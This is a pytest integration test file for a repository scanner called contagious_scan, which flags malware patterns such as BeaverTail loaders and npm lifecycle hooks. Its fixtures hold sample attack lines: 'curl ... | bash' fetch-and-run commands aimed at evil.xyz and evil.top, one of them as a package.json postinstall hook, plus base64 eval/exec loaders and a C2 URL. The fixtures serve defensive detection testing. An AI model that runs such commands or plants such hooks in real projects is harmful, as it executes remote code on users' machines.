"""Integration tests for contagious_scan.scanner.

Runs the scanner against temporary Git repository fixtures and asserts
correct findings, file discovery behaviour, and result structure.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

try:
    import git
    from git import Repo
    GIT_AVAILABLE = True
except ImportError:
    GIT_AVAILABLE = False

from contagious_scan.scanner import (
    ScanConfig,
    ScanResult,
    Scanner,
    scan,
)
from contagious_scan.detectors import Finding


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def benign_repo(tmp_path: Path) -> Path:
    """Create a minimal benign Git repository."""
    repo_dir = tmp_path / "benign_repo"
    repo_dir.mkdir()

    if GIT_AVAILABLE:
        repo = Repo.init(str(repo_dir))
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "t@t.com").release()

    (repo_dir / "index.js").write_text(
        "function greet(name) { return 'Hello, ' + name; }\n"
        "module.exports = { greet };\n"
    )
    (repo_dir / "utils.py").write_text(
        "def add(a, b):\n    return a + b\n"
    )
    (repo_dir / "package.json").write_text(
        json.dumps({
            "name": "benign-app",
            "version": "1.0.0",
            "scripts": {"test": "jest", "build": "webpack"},
            "dependencies": {"lodash": "^4.17.21"},
        })
    )

    if GIT_AVAILABLE:
        repo.index.add(["index.js", "utils.py", "package.json"])
        repo.index.commit("Initial commit")

    return repo_dir


@pytest.fixture()
def malicious_repo(tmp_path: Path) -> Path:
    """Create a Git repository with malicious file patterns."""
    repo_dir = tmp_path / "malicious_repo"
    repo_dir.mkdir()

    if GIT_AVAILABLE:
        repo = Repo.init(str(repo_dir))
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "t@t.com").release()

    # BeaverTail-style loader
    (repo_dir / "loader.js").write_text(
        "const keytar = require('keytar');\n"
        "eval(atob('SGVsbG8gV29ybGQ='));\n"
    )

    # InvisibleFerret stager
    (repo_dir / "stager.py").write_text(
        "import base64\n"
        "exec(base64.b64decode('aGVsbG8='))\n"
    )

    # Malicious package.json
    (repo_dir / "package.json").write_text(
        json.dumps({
            "name": "malicious-pkg",
            "scripts": {
                "postinstall": "curl https://evil.xyz/install.sh | bash"
            },
            "dependencies": {"dev-utils-pro": "^1.0.0"},
        })
    )

    if GIT_AVAILABLE:
        repo.index.add(["loader.js", "stager.py", "package.json"])
        repo.index.commit("Initial commit")

    return repo_dir


@pytest.fixture()
def plain_directory(tmp_path: Path) -> Path:
    """Create a plain directory (not a Git repo) with scannable files."""
    d = tmp_path / "plain_dir"
    d.mkdir()
    (d / "script.sh").write_text("curl https://evil.top/x.sh | bash\n")
    (d / "benign.py").write_text("print('hello')\n")
    return d


@pytest.fixture()
def empty_dir(tmp_path: Path) -> Path:
    """Create an empty directory with no files."""
    d = tmp_path / "empty_dir"
    d.mkdir()
    return d


@pytest.fixture()
def mixed_severity_dir(tmp_path: Path) -> Path:
    """Create a directory with findings of multiple severity levels."""
    d = tmp_path / "mixed"
    d.mkdir()
    # Critical: eval(atob(...)) — BeaverTail pattern
    (d / "critical.js").write_text(
        "eval(atob('SGVsbG8gV29ybGQ='));\n"
        "const keytar = require('keytar');\n"
    )
    # Medium/high: suspicious TLD network IOC
    (d / "network.js").write_text(
        "const c2 = 'https://malware.xyz/gate';\n"
    )
    return d


# ---------------------------------------------------------------------------
# ScanConfig tests
# ---------------------------------------------------------------------------


class TestScanConfig:
    """Tests for ScanConfig validation."""

    def test_default_config(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.staged_only is False
        assert config.min_severity == "info"
        assert config.include_history is False

    def test_invalid_min_severity_raises(self, tmp_path: Path) -> None:
        with pytest.raises(ValueError, match="Invalid min_severity"):
            ScanConfig(target_path=tmp_path, min_severity="unknown")

    def test_valid_severities_accepted(self, tmp_path: Path) -> None:
        for sev in ["critical", "high", "medium", "info"]:
            config = ScanConfig(target_path=tmp_path, min_severity=sev)
            assert config.min_severity == sev

    def test_target_path_coerced_to_path(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=str(tmp_path))
        assert isinstance(config.target_path, Path)

    def test_min_severity_lowercased(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path, min_severity="HIGH")
        assert config.min_severity == "high"

    def test_default_history_depth(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.history_depth == 20

    def test_custom_history_depth(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path, history_depth=5)
        assert config.history_depth == 5

    def test_include_history_default_false(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.include_history is False

    def test_include_untracked_default_false(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.include_untracked is False

    def test_skip_extensions_default_empty(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.skip_extensions == frozenset()

    def test_skip_extensions_accepted(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path, skip_extensions=frozenset({".js", ".py"}))
        assert ".js" in config.skip_extensions
        assert ".py" in config.skip_extensions

    def test_extra_detectors_default_empty(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.extra_detectors == []

    def test_remote_url_default_none(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.remote_url is None

    def test_clone_depth_default_one(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.clone_depth == 1

    def test_branch_default_none(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.branch is None


# ---------------------------------------------------------------------------
# ScanResult tests
# ---------------------------------------------------------------------------


class TestScanResult:
    """Tests for ScanResult properties and serialisation."""

    def _make_result(self, findings: list[Finding]) -> ScanResult:
        return ScanResult(
            repository="/test/repo",
            scan_timestamp="2024-01-01T00:00:00Z",
            findings=findings,
            scanned_files=["file1.js", "file2.py"],
            skipped_files=[],
            errors=[],
            config=ScanConfig(target_path="."),
            elapsed_seconds=1.0,
        )

    def _make_finding(self, severity: str, line_number: int = 1) -> Finding:
        return Finding(
            severity=severity,
            file_path="test.js",
            line_number=line_number,
            pattern_id=f"TEST_{severity.upper()}",
            description=f"{severity} test finding",
            matched_text="match",
            remediation="fix",
            tags=frozenset(),
        )

    def test_total_findings(self) -> None:
        findings = [self._make_finding("critical"), self._make_finding("high")]
        result = self._make_result(findings)
        assert result.total_findings == 2

    def test_total_findings_empty(self) -> None:
        result = self._make_result([])
        assert result.total_findings == 0

    def test_has_critical_true(self) -> None:
        result = self._make_result([self._make_finding("critical")])
        assert result.has_critical is True

    def test_has_critical_false(self) -> None:
        result = self._make_result([self._make_finding("high")])
        assert result.has_critical is False

    def test_has_critical_empty(self) -> None:
        result = self._make_result([])
        assert result.has_critical is False

    def test_has_high_or_above_with_high(self) -> None:
        result = self._make_result([self._make_finding("high")])
        assert result.has_high_or_above is True

    def test_has_high_or_above_with_critical(self) -> None:
        result = self._make_result([self._make_finding("critical")])
        assert result.has_high_or_above is True

    def test_has_high_or_above_with_medium(self) -> None:
        result = self._make_result([self._make_finding("medium")])
        assert result.has_high_or_above is False

    def test_has_high_or_above_empty(self) -> None:
        result = self._make_result([])
        assert result.has_high_or_above is False

    def test_findings_by_severity(self) -> None:
        findings = [
            self._make_finding("critical"),
            self._make_finding("high", line_number=2),
            self._make_finding("high", line_number=3),
        ]
        result = self._make_result(findings)
        by_sev = result.findings_by_severity
        assert len(by_sev["critical"]) == 1
        assert len(by_sev["high"]) == 2

    def test_findings_by_severity_all_levels(self) -> None:
        findings = [
            self._make_finding("critical"),
            self._make_finding("high", line_number=2),
            self._make_finding("medium", line_number=3),
            self._make_finding("info", line_number=4),
        ]
        result = self._make_result(findings)
        by_sev = result.findings_by_severity
        assert len(by_sev["critical"]) == 1
        assert len(by_sev["high"]) == 1
        assert len(by_sev["medium"]) == 1
        assert len(by_sev["info"]) == 1

    def test_findings_by_severity_empty(self) -> None:
        result = self._make_result([])
        by_sev = result.findings_by_severity
        assert by_sev["critical"] == []
        assert by_sev["high"] == []
        assert by_sev["medium"] == []
        assert by_sev["info"] == []

    def test_to_dict_keys(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        expected = {
            "scan_timestamp", "repository", "total_findings",
            "severity_summary", "findings", "scanned_files_count",
            "skipped_files_count", "errors", "elapsed_seconds",
        }
        assert set(d.keys()) == expected

    def test_to_dict_is_json_serialisable(self) -> None:
        result = self._make_result([self._make_finding("high")])
        json_str = json.dumps(result.to_dict())  # must not raise
        data = json.loads(json_str)
        assert data["total_findings"] == 1

    def test_to_dict_severity_summary(self) -> None:
        findings = [
            self._make_finding("critical"),
            self._make_finding("high", line_number=2),
        ]
        result = self._make_result(findings)
        d = result.to_dict()
        assert d["severity_summary"]["critical"] == 1
        assert d["severity_summary"]["high"] == 1
        assert d["severity_summary"]["medium"] == 0
        assert d["severity_summary"]["info"] == 0

    def test_to_dict_scanned_files_count(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        assert d["scanned_files_count"] == 2  # file1.js, file2.py

    def test_to_dict_elapsed_seconds(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        assert d["elapsed_seconds"] == 1.0

    def test_to_dict_repository(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        assert d["repository"] == "/test/repo"

    def test_to_dict_timestamp(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        assert d["scan_timestamp"] == "2024-01-01T00:00:00Z"

    def test_to_dict_findings_list(self) -> None:
        result = self._make_result([self._make_finding("high")])
        d = result.to_dict()
        assert isinstance(d["findings"], list)
        assert len(d["findings"]) == 1

    def test_to_dict_findings_serialised(self) -> None:
        result = self._make_result([self._make_finding("critical")])
        d = result.to_dict()
        finding_dict = d["findings"][0]
        assert finding_dict["severity"] == "critical"
        assert "pattern_id" in finding_dict

    def test_errors_in_result(self) -> None:
        result = ScanResult(
            repository="/test",
            scan_timestamp="2024-01-01T00:00:00Z",
            findings=[],
            scanned_files=[],
            skipped_files=[],
            errors=["Something failed"],
            config=ScanConfig(target_path="."),
        )
        assert result.errors == ["Something failed"]

    def test_elapsed_seconds_default_zero(self) -> None:
        result = ScanResult(
            repository="/test",
            scan_timestamp="2024-01-01T00:00:00Z",
            findings=[],
            scanned_files=[],
            skipped_files=[],
            errors=[],
            config=ScanConfig(target_path="."),
        )
        assert result.elapsed_seconds == 0.0


# ---------------------------------------------------------------------------
# Scanner with plain directory (no git dependency)
# ---------------------------------------------------------------------------


class TestScannerPlainDirectory:
    """Tests that run against a plain directory without requiring Git."""

    def test_scan_finds_malicious_pattern(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory, min_severity="info")
        result = Scanner(config).run()
        assert result.total_findings > 0

    def test_scan_result_has_repository_label(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert str(plain_directory.resolve()) in result.repository

    def test_scan_returns_scan_result(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert isinstance(result, ScanResult)

    def test_scan_records_scanned_files(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert len(result.scanned_files) > 0

    def test_scan_has_no_errors(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.errors == []

    def test_scan_nonexistent_path_returns_errors(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path / "does_not_exist")
        result = Scanner(config).run()
        assert len(result.errors) > 0
        assert result.total_findings == 0

    def test_min_severity_filters_findings(self, plain_directory: Path) -> None:
        config_all = ScanConfig(target_path=plain_directory, min_severity="info")
        config_critical = ScanConfig(target_path=plain_directory, min_severity="critical")
        result_all = Scanner(config_all).run()
        result_critical = Scanner(config_critical).run()
        assert result_critical.total_findings <= result_all.total_findings

    def test_findings_sorted_by_severity(self, plain_directory: Path) -> None:
        from contagious_scan.signatures import severity_rank
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        for i in range(len(result.findings) - 1):
            assert (
                severity_rank(result.findings[i].severity)
                >= severity_rank(result.findings[i + 1].severity)
            )

    def test_no_duplicate_findings(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        keys = [
            (f.file_path, f.line_number, f.pattern_id)
            for f in result.findings
        ]
        assert len(keys) == len(set(keys))

    def test_elapsed_seconds_non_negative(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.elapsed_seconds >= 0

    def test_scan_timestamp_format(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.scan_timestamp.endswith("Z")

    def test_scan_empty_directory(self, empty_dir: Path) -> None:
        config = ScanConfig(target_path=empty_dir)
        result = Scanner(config).run()
        assert result.total_findings == 0
        assert result.errors == []

    def test_scan_result_has_scan_timestamp(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert isinstance(result.scan_timestamp, str)
        assert len(result.scan_timestamp) > 0

    def test_scan_result_has_config(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.config is config

    def test_scan_result_scanned_files_are_strings(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        for f in result.scanned_files:
            assert isinstance(f, str)

    def test_scan_result_skipped_files_are_strings(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        for f in result.skipped_files:
            assert isinstance(f, str)

    def test_scan_findings_all_have_valid_severities(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        valid_severities = {"critical", "high", "medium", "info"}
        for f in result.findings:
            assert f.severity in valid_severities

    def test_scan_findings_all_have_file_path(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        for f in result.findings:
            assert isinstance(f.file_path, str)
            assert f.file_path != ""

    def test_scan_findings_all_have_line_numbers(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        for f in result.findings:
            assert isinstance(f.line_number, int)
            assert f.line_number >= 1

    def test_scan_mixed_severity_directory(self, mixed_severity_dir: Path) -> None:
        config = ScanConfig(target_path=mixed_severity_dir, min_severity="info")
        result = Scanner(config).run()
        assert result.total_findings > 0
        severities = {f.severity for f in result.findings}
        # Should have at least one critical finding from critical.js
        assert "critical" in severities or len(result.findings) > 0

    def test_scan_critical_only_filter(self, mixed_severity_dir: Path) -> None:
        from contagious_scan.signatures import severity_rank
        config = ScanConfig(target_path=mixed_severity_dir, min_severity="critical")
        result = Scanner(config).run()
        for f in result.findings:
            assert severity_rank(f.severity) >= severity_rank("critical")


# ---------------------------------------------------------------------------
# Scanner with Git repository (requires GitPython)
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not GIT_AVAILABLE, reason="GitPython not installed")
class TestScannerGitRepo:
    """Tests for Scanner with Git repositories."""

    def test_benign_repo_no_critical_findings(self, benign_repo: Path) -> None:
        config = ScanConfig(target_path=benign_repo, min_severity="critical")
        result = Scanner(config).run()
        assert result.has_critical is False

    def test_malicious_repo_has_critical_findings(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo, min_severity="info")
        result = Scanner(config).run()
        assert result.has_critical is True

    def test_malicious_repo_detects_beavertail(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        pattern_ids = {f.pattern_id for f in result.findings}
        assert any(
            pid.startswith("BT_") or "EVAL_ATOB" in pid
            for pid in pattern_ids
        )

    def test_malicious_repo_detects_lifecycle_hooks(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        lh_findings = [
            f for f in result.findings
            if "lifecycle-hook" in f.tags or "LH_" in f.pattern_id
        ]
        assert len(lh_findings) > 0

    def test_malicious_repo_detects_suspicious_packages(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        pkg_findings = [
            f for f in result.findings if "PKG_" in f.pattern_id
        ]
        assert len(pkg_findings) > 0

    def test_scan_records_js_files(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        js_files = [f for f in result.scanned_files if f.endswith(".js")]
        assert len(js_files) > 0

    def test_scan_records_py_files(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        py_files = [f for f in result.scanned_files if f.endswith(".py")]
        assert len(py_files) > 0

    def test_benign_repo_scan_result_type(self, benign_repo: Path) -> None:
        config = ScanConfig(target_path=benign_repo)
        result = Scanner(config).run()
        assert isinstance(result, ScanResult)

    def test_benign_repo_has_scanned_files(self, benign_repo: Path) -> None:
        config = ScanConfig(target_path=benign_repo)
        result = Scanner(config).run()
        assert len(result.scanned_files) > 0

    def test_git_repo_no_errors_on_valid_repo(self, benign_repo: Path) -> None:
        config = ScanConfig(target_path=benign_repo)
        result = Scanner(config).run()
        assert result.errors == []

    def test_include_untracked_flag_accepted(self, benign_repo: Path) -> None:
        config = ScanConfig(target_path=benign_repo, include_untracked=True)
        result = Scanner(config).run()
        assert isinstance(result, ScanResult)

    def test_scan_with_skip_extension_no_py_findings(
        self, malicious_repo: Path
    ) -> None:
        config = ScanConfig(
            target_path=malicious_repo,
            skip_extensions=frozenset({".py"}),
        )
        result = Scanner(config).run()
        py_findings = [f for f in result.findings if f.file_path.endswith(".py")]
        assert py_findings == []

    def test_scan_with_skip_js_and_py_reduces_findings(
        self, malicious_repo: Path
    ) -> None:
        config_all = ScanConfig(target_path=malicious_repo, min_severity="info")
        config_skip = ScanConfig(
            target_path=malicious_repo,
            min_severity="info",
            skip_extensions=frozenset({".js", ".py"}),
        )
        result_all = Scanner(config_all).run()
        result_skip = Scanner(config_skip).run()
        assert result_skip.total_findings <= result_all.total_findings

    def test_malicious_repo_findings_no_duplicates(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        keys = [
            (f.file_path, f.line_number, f.pattern_id)
            for f in result.findings
        ]
        assert len(keys) == len(set(keys))

    def test_malicious_repo_findings_sorted(self, malicious_repo: Path) -> None:
        from contagious_scan.signatures import severity_rank
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        for i in range(len(result.findings) - 1):
            assert (
                severity_rank(result.findings[i].severity)
                >= severity_rank(result.findings[i + 1].severity)
            )


# ---------------------------------------------------------------------------
# Scanner staged-only mode (requires GitPython)
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not GIT_AVAILABLE, reason="GitPython not installed")
class TestScannerStagedOnly:
    """Tests for Scanner in staged-only (hook) mode."""

    @pytest.fixture()
    def staged_malicious_repo(self, tmp_path: Path) -> Path:
        """Create a repo with a staged malicious file."""
        repo_dir = tmp_path / "staged_malicious"
        repo_dir.mkdir()
        repo = Repo.init(str(repo_dir))
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "t@t.com").release()

        # Initial benign commit
        (repo_dir / "benign.js").write_text("console.log('hello');\n")
        repo.index.add(["benign.js"])
        repo.index.commit("Initial")

        # Stage a malicious file
        (repo_dir / "evil.js").write_text(
            "eval(atob('SGVsbG8gV29ybGQ='));\n"
        )
        repo.index.add(["evil.js"])
        return repo_dir

    def test_staged_only_returns_scan_result(self, staged_malicious_repo: Path) -> None:
        config = ScanConfig(target_path=staged_malicious_repo, staged_only=True)
        result = Scanner(config).run()
        assert isinstance(result, ScanResult)

    def test_staged_only_on_non_git_returns_error(self, tmp_path: Path) -> None:
        d = tmp_path / "not_a_repo"
        d.mkdir()
        config = ScanConfig(target_path=d, staged_only=True)
        result = Scanner(config).run()
        assert len(result.errors) > 0


# ---------------------------------------------------------------------------
# Scanner extra detectors
# ---------------------------------------------------------------------------


class TestScannerExtraDetectors:
    """Tests for the extra_detectors configuration option."""

    def test_extra_detector_called(self, plain_directory: Path) -> None:
        calls: list[str] = []

        def custom_detector(content: str, file_path: str) -> list[Finding]:
            calls.append(file_path)
            return []

        config = ScanConfig(
            target_path=plain_directory,
            extra_detectors=[custom_detector],
        )
        result = Scanner(config).run()
        assert len(calls) > 0

    def test_extra_detector_findings_included(self, plain_directory: Path) -> None:
        def custom_detector(content: str, file_path: str) -> list[Finding]:
            if "hello" in content.lower():
                return [
                    Finding(
                        severity="info",
                        file_path=file_path,
                        line_number=1,
                        pattern_id="CUSTOM_HELLO",
                        description="Custom detector: found 'hello'",
                        matched_text="hello",
                        remediation="n/a",
                        tags=frozenset({"custom"}),
                    )
                ]
            return []

        config = ScanConfig(
            target_path=plain_directory,
            extra_detectors=[custom_detector],
            min_severity="info",
        )
        result = Scanner(config).run()
        custom_findings = [
            f for f in result.findings if f.pattern_id == "CUSTOM_HELLO"
        ]
        assert len(custom_findings) > 0

    def test_extra_detector_exception_does_not_crash_scan(
        self, plain_directory: Path
    ) -> None:
        def bad_detector(content: str, file_path: str) -> list[Finding]:
            raise RuntimeError("I am broken")

        config = ScanConfig(
            target_path=plain_directory,
            extra_detectors=[bad_detector],
        )
        # Should not raise; exception is caught internally
        result = Scanner(config).run()
        assert isinstance(result, ScanResult)

    def test_multiple_extra_detectors(self, plain_directory: Path) -> None:
        def detector_a(content: str, file_path: str) -> list[Finding]:
            return [
                Finding(
                    severity="info",
                    file_path=file_path,
                    line_number=1,
                    pattern_id="CUSTOM_A",
                    description="Detector A",
                    matched_text="",
                    remediation="",
                    tags=frozenset({"custom-a"}),
                )
            ]

        def detector_b(content: str, file_path: str) -> list[Finding]:
            return [
                Finding(
                    severity="info",
                    file_path=file_path,
                    line_number=1,
                    pattern_id="CUSTOM_B",
                    description="Detector B",
                    matched_text="",
                    remediation="",
                    tags=frozenset({"custom-b"}),
                )
            ]

        config = ScanConfig(
            target_path=plain_directory,
            extra_detectors=[detector_a, detector_b],
            min_severity="info",
        )
        result = Scanner(config).run()
        pattern_ids = {f.pattern_id for f in result.findings}
        assert "CUSTOM_A" in pattern_ids
        assert "CUSTOM_B" in pattern_ids


# ---------------------------------------------------------------------------
# Scanner skip_extensions tests
# ---------------------------------------------------------------------------


class TestScannerSkipExtensions:
    """Tests for extension-based file skipping."""

    def test_skip_js_extension(self, plain_directory: Path) -> None:
        # Create a .js file with malicious content
        (plain_directory / "evil.js").write_text("eval(atob('payload'))")

        config_no_skip = ScanConfig(target_path=plain_directory)
        config_skip = ScanConfig(
            target_path=plain_directory,
            skip_extensions=frozenset({".js"}),
        )
        result_no_skip = Scanner(config_no_skip).run()
        result_skip = Scanner(config_skip).run()

        js_findings_no_skip = [f for f in result_no_skip.findings if f.file_path.endswith(".js")]
        js_findings_skip = [f for f in result_skip.findings if f.file_path.endswith(".js")]

        # Skipping .js should result in fewer (or zero) .js findings
        assert len(js_findings_skip) <= len(js_findings_no_skip)

    def test_skip_extension_skipped_files_recorded(self, plain_directory: Path) -> None:
        (plain_directory / "skipped.js").write_text("eval(atob('payload'))")
        config = ScanConfig(
            target_path=plain_directory,
            skip_extensions=frozenset({".js"}),
        )
        result = Scanner(config).run()
        # Skipped files should be recorded
        skipped_js = [f for f in result.skipped_files if f.endswith(".js")]
        assert len(skipped_js) > 0

    def test_skip_nonexistent_extension_no_effect(self, plain_directory: Path) -> None:
        config = ScanConfig(
            target_path=plain_directory,
            skip_extensions=frozenset({".xyz"}),
        )
        result_normal = Scanner(ScanConfig(target_path=plain_directory)).run()
        result_skip = Scanner(config).run()
        # No .xyz files => same number of scanned files
        assert len(result_skip.scanned_files) == len(result_normal.scanned_files)

    def test_skip_all_extensions_no_findings(self, plain_directory: Path) -> None:
        config = ScanConfig(
            target_path=plain_directory,
            skip_extensions=frozenset({".sh", ".py", ".js", ".json"}),
        )
        result = Scanner(config).run()
        assert result.total_findings == 0


# ---------------------------------------------------------------------------
# scan() convenience function tests
# ---------------------------------------------------------------------------


class TestScanFunction:
    """Tests for the scan() convenience function."""

    def test_scan_returns_scan_result(self, plain_directory: Path) -> None:
        result = scan(plain_directory)
        assert isinstance(result, ScanResult)

    def test_scan_with_min_severity(self, plain_directory: Path) -> None:
        result = scan(plain_directory, min_severity="critical")
        assert isinstance(result, ScanResult)
        from contagious_scan.signatures import severity_rank
        for f in result.findings:
            assert severity_rank(f.severity) >= severity_rank("critical")

    def test_scan_with_extra_detector(self, plain_directory: Path) -> None:
        def custom_detector(content: str, file_path: str) -> list[Finding]:
            if "hello" in content.lower():
                return [
                    Finding(
                        severity="info",
                        file_path=file_path,
                        line_number=1,
                        pattern_id="CUSTOM_HELLO",
                        description="Custom detector: found 'hello'",
                        matched_text="hello",
                        remediation="n/a",
                        tags=frozenset({"custom"}),
                    )
                ]
            return []

        result = scan(
            plain_directory,
            extra_detectors=[custom_detector],
            min_severity="info",
        )
        custom_findings = [
            f for f in result.findings if f.pattern_id == "CUSTOM_HELLO"
        ]
        assert len(custom_findings) > 0

    def test_scan_nonexistent_path(self, tmp_path: Path) -> None:
        result = scan(tmp_path / "ghost")
        assert len(result.errors) > 0

    def test_scan_progress_callback_called(self, plain_directory: Path) -> None:
        calls: list[tuple[str, int, int]] = []

        def callback(path: str, done: int, total: int) -> None:
            calls.append((path, done, total))

        result = scan(plain_directory, progress_callback=callback)
        if result.scanned_files:
            assert len(calls) > 0

    def test_scan_progress_callback_args_valid(self, plain_directory: Path) -> None:
        calls: list[tuple[str, int, int]] = []

        def callback(path: str, done: int, total: int) -> None:
            calls.append((path, done, total))

        scan(plain_directory, progress_callback=callback)
        for path, done, total in calls:
            assert isinstance(path, str)
            assert isinstance(done, int)
            assert isinstance(total, int)
            assert done >= 1
            assert total >= done

    def test_scan_with_string_path(self, plain_directory: Path) -> None:
        result = scan(str(plain_directory))
        assert isinstance(result, ScanResult)

    def test_scan_min_severity_info_returns_all(self, plain_directory: Path) -> None:
        result_info = scan(plain_directory, min_severity="info")
        result_critical = scan(plain_directory, min_severity="critical")
        assert result_info.total_findings >= result_critical.total_findings

    def test_scan_returns_non_negative_elapsed(self, plain_directory: Path) -> None:
        result = scan(plain_directory)
        assert result.elapsed_seconds >= 0

    def test_scan_timestamp_not_empty(self, plain_directory: Path) -> None:
        result = scan(plain_directory)
        assert result.scan_timestamp != ""
        assert result.scan_timestamp.endswith("Z")

    def test_scan_with_broken_progress_callback_does_not_crash(
        self, plain_directory: Path
    ) -> None:
        def bad_callback(path: str, done: int, total: int) -> None:
            raise RuntimeError("broken callback")

        # Should not propagate the exception
        result = scan(plain_directory, progress_callback=bad_callback)
        assert isinstance(result, ScanResult)


# ---------------------------------------------------------------------------
# Scanner progress callback tests
# ---------------------------------------------------------------------------


class TestScannerProgressCallback:
    """Tests for the Scanner progress callback."""

    def test_callback_invoked_per_file(self, plain_directory: Path) -> None:
        calls: list[tuple[str, int, int]] = []

        def cb(path: str, done: int, total: int) -> None:
            calls.append((path, done, total))

        config = ScanConfig(target_path=plain_directory)
        scanner = Scanner(config, progress_callback=cb)
        result = scanner.run()

        assert len(calls) == len(result.scanned_files)

    def test_callback_total_consistent(self, plain_directory: Path) -> None:
        totals: list[int] = []

        def cb(path: str, done: int, total: int) -> None:
            totals.append(total)

        config = ScanConfig(target_path=plain_directory)
        Scanner(config, progress_callback=cb).run()

        if totals:
            # All calls should have the same total
            assert len(set(totals)) == 1

    def test_callback_done_increments(self, plain_directory: Path) -> None:
        done_values: list[int] = []

        def cb(path: str, done: int, total: int) -> None:
            done_values.append(done)

        config = ScanConfig(target_path=plain_directory)
        Scanner(config, progress_callback=cb).run()

        if len(done_values) > 1:
            # done should be monotonically increasing
            for i in range(len(done_values) - 1):
                assert done_values[i] < done_values[i + 1]

    def test_no_callback_no_crash(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        scanner = Scanner(config, progress_callback=None)
        result = scanner.run()
        assert isinstance(result, ScanResult)


# ---------------------------------------------------------------------------
# Scanner to_dict / JSON serialisation
# ---------------------------------------------------------------------------


class TestScanResultSerialisationRoundtrip:
    """Tests that ScanResult.to_dict() produces JSON-serialisable output."""

    def test_to_dict_json_roundtrip(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory, min_severity="info")
        result = Scanner(config).run()
        data = result.to_dict()
        json_str = json.dumps(data)  # must not raise
        recovered = json.loads(json_str)
        assert recovered["total_findings"] == result.total_findings

    def test_to_dict_findings_match_count(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory, min_severity="info")
        result = Scanner(config).run()
        data = result.to_dict()
        assert len(data["findings"]) == data["total_findings"]

    def test_to_dict_severity_summary_sums_correctly(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory, min_severity="info")
        result = Scanner(config).run()
        data = result.to_dict()
        total = sum(data["severity_summary"].values())
        assert total == data["total_findings"]

    def test_to_dict_errors_is_list(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        data = result.to_dict()
        assert isinstance(data["errors"], list)

    def test_to_dict_elapsed_seconds_is_float(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        data = result.to_dict()
        assert isinstance(data["elapsed_seconds"], float)
